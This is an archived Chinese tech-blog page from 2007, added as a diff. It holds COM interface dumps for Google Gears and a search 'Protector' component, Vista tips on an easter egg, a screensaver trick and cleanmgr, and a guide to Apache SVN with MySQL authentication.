+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function create(class_name:BSTR; class_version:BSTR): IDispatch;<br>
+function getBuildInfo: BSTR;</p>
+<p>Dispatch GearsFactoryInterface;<br>
+GUID={CADD7DF9-B7AF-426D-AE24-5E00CB8CF982};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function create(class_name:BSTR; class_version:BSTR): IDispatch;<br>
+function getBuildInfo: BSTR;</p>
+<p>Class GearsDatabase;<br>
+GUID={B09AFBD8-FBEE-4E91-AA27-7DC433C978AB};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function open([database_name:^variant]);<br>
+function execute(expression:BSTR; [arg_array:^variant]): ^GearsResultSetInterface;<br>
+function close;<br>
+property-get lastInsertRowId: variant;</p>
+<p>Dispatch GearsDatabaseInterface;<br>
+GUID={DFCF5BD9-9C89-46EC-BC01-8A5E31E6DD3A};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function open([database_name:^variant]);<br>
+function execute(expression:BSTR; [arg_array:^variant]): ^GearsResultSetInterface;<br>
+function close;<br>
+property-get lastInsertRowId: variant;</p>
+<p>Dispatch GearsResultSetInterface;<br>
+GUID={B8A9C568-C1C1-49BD-A752-FDC3A4022825};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function field(index:INT): variant;<br>
+function fieldByName(field_name:BSTR): variant;<br>
+function fieldName(index:INT): variant;<br>
+function fieldCount: INT;<br>
+function close;<br>
+function next;<br>
+function isValidRow: bool;</p>
+<p>Class GearsWorkerPool;<br>
+GUID={B76AFB62-9BA2-43E8-B27F-9F1CAC8148B7};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function createWorker(full_script:^BSTR): INT;<br>
+function sendMessage(message_string:^BSTR; dest_worker_id:INT);<br>
+property-put onmessage(IDispatch);</p>
+<p>Dispatch GearsWorkerPoolInterface;<br>
+GUID={D9583548-7181-4F86-8C19-C02154D5256F};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function createWorker(full_script:^BSTR): INT;<br>
+function sendMessage(message_string:^BSTR; dest_worker_id:INT);<br>
+property-put onmessage(IDispatch);</p>
+<p>Class GearsLocalServer;<br>
+GUID={3A826505-92E3-486A-9FB5-37FE89E971F9};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function canServeLocally(url:BSTR): bool;<br>
+function createManagedStore(name:BSTR; [required_cookie:^variant]): ^GearsManagedResourceStoreInterface;<br>
+function openManagedStore(name:BSTR; [required_cookie:^variant]): ^GearsManagedResourceStoreInterface;<br>
+function removeManagedStore(name:BSTR; [required_cookie:^variant]);<br>
+function createStore(name:BSTR; [required_cookie:^variant]): ^GearsResourceStoreInterface;<br>
+function openStore(name:BSTR; [required_cookie:^variant]): ^GearsResourceStoreInterface;<br>
+function removeStore(name:BSTR; [required_cookie:^variant]);</p>
+<p>Dispatch GearsLocalServerInterface;<br>
+GUID={A207BB88-9F3B-4B5E-A267-234C4DDDB331};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function canServeLocally(url:BSTR): bool;<br>
+function createManagedStore(name:BSTR; [required_cookie:^variant]): ^GearsManagedResourceStoreInterface;<br>
+function openManagedStore(name:BSTR; [required_cookie:^variant]): ^GearsManagedResourceStoreInterface;<br>
+function removeManagedStore(name:BSTR; [required_cookie:^variant]);<br>
+function createStore(name:BSTR; [required_cookie:^variant]): ^GearsResourceStoreInterface;<br>
+function openStore(name:BSTR; [required_cookie:^variant]): ^GearsResourceStoreInterface;<br>
+function removeStore(name:BSTR; [required_cookie:^variant]);</p>
+<p>Dispatch GearsManagedResourceStoreInterface;<br>
+GUID={990DC8DD-A97D-4701-962A-53721251821C};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+property-get name: BSTR;<br>
+property-get requiredCookie: BSTR;<br>
+property-get enabled: bool;<br>
+property-put enabled(bool);<br>
+property-get manifestUrl: BSTR;<br>
+property-put manifestUrl(BSTR);<br>
+property-get lastUpdateCheckTime: I4;<br>
+property-get updateStatus: INT;<br>
+property-get lastErrorMessage: BSTR;<br>
+function checkForUpdate;<br>
+property-get currentVersion: BSTR;</p>
+<p>Dispatch GearsResourceStoreInterface;<br>
+GUID={3F84AC4C-F26D-4A75-9E22-6695F6953EDD};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+property-get name: BSTR;<br>
+property-get requiredCookie: BSTR;<br>
+property-get enabled: bool;<br>
+property-put enabled(bool);<br>
+function capture(urls:^variant; completion_callback:IDispatch): I4;<br>
+function abortCapture(capture_id:I4);<br>
+function isCaptured(url:BSTR): bool;<br>
+function remove(url:BSTR);<br>
+function rename(src_url:BSTR; dst_url:BSTR);<br>
+function copy(src_url:BSTR; dst_url:BSTR);<br>
+function getHeader(url:BSTR; header:BSTR): BSTR;<br>
+function getAllHeaders(url:BSTR): BSTR;<br>
+function captureFile(file_input_element:IDispatch; url:BSTR);<br>
+function getCapturedFileName(url:BSTR): BSTR;<br>
+function createFileSubmitter: ^GearsFileSubmitterInterface;</p>
+<p>Dispatch GearsFileSubmitterInterface;<br>
+GUID={0747A88C-5033-44F7-94B4-2E2823925996};<br>
+function QueryInterface(riid:^GUID; out ppvObj:^^void);<br>
+function AddRef: UI4;<br>
+function Release: UI4;<br>
+function GetTypeInfoCount(out pctinfo:^UINT);<br>
+function GetTypeInfo(itinfo:UINT; lcid:UI4; out pptinfo:^^void);<br>
+function GetIDsOfNames(riid:^GUID; rgszNames:^^I1; cNames:UINT; lcid:UI4; out rgdispid:^I4);<br>
+function Invoke(dispidMember:I4; riid:^GUID; lcid:UI4; wFlags:UI2; pdispparams:^DISPPARAMS; out pvarResult:^variant; out pexcepinfo:^EXCEPINFO; out puArgErr:^UINT);<br>
+function setFileInputElement(file_input_element:IDispatch; resource_url:BSTR);</p>
+<p>ProtectorExeLib; // ProtectorExe 2.0 Type Library</p>
+<p>Class ProtectorHost; // ProtectorHost Class<br>
+GUID={FBA44040-BD27-4A09-ACC8-C08B7C723DCD};<br>
+function Uninstall2(client:BSTR; sid:BSTR; keep_reg_settings:I4): HResult;</p>
+<p>Interface IProtectorHost2;<br>
+GUID={91959FBB-853A-4AC7-A082-2DDF787F4CA9};<br>
+function Uninstall2(client:BSTR; sid:BSTR; keep_reg_settings:I4): HResult;</p>
+<p>Interface IProtectorHost;<br>
+GUID={DA69D3CC-7676-4A65-889F-C052977F1AA9};<br>
+function GetProtector(out protector:^IUnknown): HResult;<br>
+function LockProtector(lock:I4): HResult;<br>
+function Uninstall(client:BSTR): HResult;</p>
+<p>protector_dllLib;</p>
+<p>Class Protector;<br>
+GUID={6134CEA9-DD6E-495C-A0D1-4F232027D7D7};<br>
+function SetSID(sid:BSTR): HResult;</p>
+<p>Interface IProtector3;<br>
+GUID={91F39C2A-95E7-497A-A539-0AC715DC66D2};<br>
+function SetSID(sid:BSTR): HResult;</p>
+<p>Interface IProtector2;<br>
+GUID={2212951C-1623-4095-906B-AC50B8F91016};<br>
+function SignalToShutdown: HResult;</p>
+<p>Interface IProtector;<br>
+GUID={2351B346-00E8-4EAC-9B75-B138B465D659};<br>
+function Init: HResult;<br>
+function EnableProtection(enable:I4): HResult;<br>
+function IsProtectionOn(out enabled:^I4): HResult;<br>
+function SetNotify(notify:I4): HResult;<br>
+function GetNotify(out notify:^I4): HResult;<br>
+function SetHostPriority(host_priority:I4): HResult;<br>
+function GetHostPriority(out host_priority:^I4): HResult;<br>
+function GetVersion(out major:^INT; out minor:^INT; out build:^INT; out revision:^INT): HResult;<br>
+function SetOffered(offered:I4): HResult;<br>
+function GetOffered(out offered:^I4): HResult;<br>
+function SetSearchDomain(domain:BSTR): HResult;<br>
+function GetSearchDomain(out domain:^BSTR): HResult;<br>
+function IsGoogleDefaultSearch(out is_google:^I4): HResult;<br>
+function EnableUsageStat(enable:I4): HResult;</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-12-23T02:36:12+08:00">2007-12-23</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/605743"  rel="bookmark" >
+              <h2 class="card-title">Vista Easter Egg</h2>
+            </a>
+            <p class="card-text"><p>Vista users, simply click this link: <a href='about:%3Cbgsound%20src="res%3A//C%3A%5CWINDOWS%5CSystem32%5CSpeech%5CSpeechUX%5CSpeechUX.dll/WAVE/WELCOMESEQUENCE.WAV"%3E' target="_blank">Vista Easter Egg</a></p>
+<p>Or Win+R run this script:<br>
+<code>about:&lt;bgsound src="res://%WINDIR%\System32\Speech\SpeechUX\SpeechUX.dll/WAVE/WELCOMESEQUENCE.WAV"&gt;</code><br>
+<img src='http://wpcache.yo2.cn/wp-content/uploads/74/7487/2007/12/16.jpg' alt='16.jpg'></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-12-23T02:07:03+08:00">2007-12-23</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/605698"  rel="bookmark" >
+              <h2 class="card-title">让Vista的屏保在桌面运行！Cool！</h2>
+            </a>
+            <p class="card-text"><p>来源 <a href="http://jsbi.blogspot.com/2006/10/make-any-screensaver-as-your-desktop.html">http://jsbi.blogspot.com/2006/10/make-any-screensaver-as-your-desktop.html</a></p>
+<p>Windows闭源的最大乐趣就是reverse engineering和hacking，这不，<a href="http://www.istartedsomething.com/about/">一个华人</a>研究出了一个Vista下非常好玩的东东，在桌面运行屏保，不影响工作。</p>
+<p>首先打开Spy++，这个工具是人手一份吧？好，找到你桌面的 hwnd ID，如图</p>
+<p><img src='http://wpcache.yo2.cn/wp-content/uploads/74/7487/2007/12/15.jpg' alt='15.jpg' width="5" height="5"></p>
+<p>然后Win+R运行 <code>calc</code> 计算器，选择 科学计算器，切换到 十六进制，Ctrl+V，切换到十进制，好啦，我们得到了桌面窗体的hwnd十进制ID，这里我得到的是 262216。</p>
+<p><img src='http://wpcache.yo2.cn/wp-content/uploads/74/7487/2007/12/2.jpg' alt='2.jpg' width="5" height="5"></p>
+<p>Win+R运行CMD，输入 C:\WINDOWS\System32\Ribbons.scr /p 262216，回车。注意这里必须在CMD里运行，在Win+R里运行是没有效果滴（我也很好奇为什么？？）</p>
+<p>切换到桌面，看看？？哇咔咔，漂亮吧？？Vista的图形内核Avalon看来是很强大的！mystify.scr, ribbons.scr, aurora.scr 和 SSBranded.scr 同理！</p>
+<p>说不定，我们很多程序可以实现免费的DreamScene！</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-12-23T01:32:59+08:00">2007-12-23</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/605660"  rel="bookmark" >
+              <h2 class="card-title">cleanmgr参数，实测Vista有效</h2>
+            </a>
+            <p class="card-text"><p><code>cleanmgr /d C: /sageset:50</code></p>
+<p>比盘符点属性进入的 磁盘清理 多了很多选项。</p>
+<p>来源：<a href="http://windowsxp.mvps.org/clearxptif.htm">http://windowsxp.mvps.org/clearxptif.htm</a></p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-12-23T01:01:17+08:00">2007-12-23</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+
+        <!-- new article -->
+        <div class="card blog-card">
+          <article class="card-body">
+            <a href="/yo2/603604"  rel="bookmark" >
+              <h2 class="card-title">[Debian Etch]SVN+Apache2.2+MySQL认证 配置指南[mod_authnz_external]</h2>
+            </a>
+            <p class="card-text"><p>首先说，Apache2.2支持HTTP认证，来源有多种，但是支持第三方MySQL数据表认证的MOD就少了，<a href="http://modauthmysql.sourceforge.net/">mod_auth_mysql</a>是最著名的，也是最早烂的，我根本在etch上编译不起；其次是 <a href="http://packages.debian.org/stable/web/libapache2-mod-auth-pam">libapache2-mod-auth-pam</a> 加 <a href="http://packages.debian.org/libpam-mysql">libpam-mysql</a> ，这个也失败，因为PAM也停止开发了。</p>
+<p>经过我千辛万苦Google了大半个月，终于发现了最好的Apache2.2验证MOD：<a href="http://unixpapa.com/mod_auth_external.html">mod_authnz_external</a>。</p>
+<p>原理很简单，mod_auth_external会调用一个外部命令，如果命令以错误代码0退出，那么验证成功；如果以错误代码1等等退出，那么验证失败。OK，开始配置<br>
+<code><br>
+apt-get install apache2<br>
+apt-get install subversion<br>
+apt-get install libapache2-svn<br></code><br>
+编辑 <code>vim /etc/apache2/mods-enabled/dav_svn.conf</code><br>
+内容为</p>
+<pre>
+&lt;Location /svn&gt;
+  DAV svn
+  SVNPath /srv/svn<br>
+  AuthName               "Dormforce SVN"
+  AuthType               Basic
+  AuthBasicProvider      external
+  AuthExternal           auth_dormid
+  require                valid-user<br>
+&lt;/Location&gt;
+</pre>
+<p>现在你已经有一个没有authentication的SVN跑起来了，利用的是apache2的DAV模块。</p>
+<p>下载mod_auth_external for apache2.2的<a href="http://unixpapa.com/software/mod_authnz_external-3.1.0.tar.gz">源码包</a>。<br>
+<code><br>
+apt-get install build-essential<br>
+apt-get install apache2-threaded-dev<br>
+aot-get install apache2-prefork-dev<br></code><br>
+然后 <code>tar -xvf mod_authnz_external-3.1.0.tar.gz</code>，进入解压的目录<br>
+<code>apxs -c mod_authnz_external.c<br>
+apxs -i -a mod_authnz_external.la</code><br>
+编译好了模块，接下来安装到Apache2，<code>vim /etc/apache2/mods-enabled/authnz_external.load</code>，输入<br>
+<code><br>
+LoadModule authnz_external_module /usr/lib/apache2/modules/mod_authnz_external.so<br></code></p>
+<p>好了，我们编辑Apache2主配置文件<code>vim /etc/apache2/apache2.conf</code><br>
+在最后加上<br>
+<code><br>
+AddExternalAuth auth_dormid /srv/auth_dormid/auth_dormid.py<br>
+SetExternalAuthMethod auth_dormid environment<br></code></p>
+<p>OK，自己编写一个小小的python程序，查询MySQL数据库，如果环境变量USER和环境变量PASS和数据库中查询结果是一致的，那么sys.exit(0)，否则sys.exit(1)</p>
+<p>测试一下，<code>/etc/init.d/apache2 restart</code>重启apache，看看你的网站 /svn 目录，应该可以访问SVN啦。</p>
+<p>下面我解释下配置文件里修改的内容对应的含义。<br>
+<b>apache2.conf</b><br>
+　AddExternalAuth auth_dormid /srv/auth_dormid/auth_dormid.py<br>
+　　　　　　　　　　　关键词　　　　　执行命令路径<br>
+SetExternalAuthMethod auth_dormid environment<br>
+　　　　　　　　　　　　　关键词　　　通过系统环境变量传递认证值，同时可以设置为 pipe，管道</p>
+<p><b>dav_svn.conf</b><br>
+AuthName "Dormforce SVN"　这里是浏览器弹出的提示窗口的文字<br>
+AuthType Basic　　　　　　　HTTP Basic认证，使用Basr64加密后传输<br>
+AuthBasicProvider external　　　　　认证来源是 mod_authnz_external<br>
+AuthExternal auth_dormid　　　上面设置的 关键词<br>
+require valid-user　　　　　　需要成功认证的用户和密码才能访问页面</p></p>
+            <div class="card-subtext muted-text">
+              <p>Posted <time datetime="2007-12-22T16:41:19+08:00">2007-12-22</time></p>
+<p>archive</p>            </div>
+          </article>
+        </div>
+
+    </main>
+    <nav class="pagination-nav side-padding">
+<a href="/category/archive.25.html" class="pagination-newer">&lt; Newer Posts</a><a href="/category/archive.27.html" class="pagination-older">Older Posts &gt;</a>    </nav>
+
+<script src="/theme/js/core.js"></script>
+
+  </body>
+</html>
